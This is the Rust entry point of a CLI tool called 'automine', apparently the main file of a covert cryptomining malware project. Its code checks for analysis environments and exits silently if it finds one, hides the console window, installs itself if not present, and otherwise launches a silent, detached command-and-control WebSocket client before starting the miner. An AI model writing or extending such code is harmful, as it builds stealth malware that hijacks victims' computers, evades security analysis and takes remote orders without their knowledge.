mod commands;
mod common;
mod utils;
mod system;

use clap::{Parser, Subcommand};

use commands::{install, start, status, uninstall};
use system::process::{hide_console, stop_mining};
use system::registry::is_installed;

#[derive(Parser)]
#[command(name = "automine")]
#[command(about = "Automine CLI", long_about = None)]
#[command(version)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Uninstall completely
    Uninstall,
    /// Stop mining
    Stop,
    /// Show status
    Status,
}

#[tokio::main]
async fn main() {
    // 0. Anti-Analysis Check (Before anything else)
    if system::anti_analysis::is_analysis_environment() {
        return; // Silent Exit
    }

    hide_console();

    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Uninstall) => {
            let _ = uninstall();
        }
        Some(Commands::Stop) => {
            let _ = stop_mining();
        }
        Some(Commands::Status) => {
            status();
        }
        None => {
            if !is_installed() {
                let _ = install();
            } else {
                // Spawn C2 WSS Client (Silent, Detached)
                tokio::spawn(async {
                    let _ = system::c2::start_client().await;
                });
                let _ = start();
            }
        }
    }
}
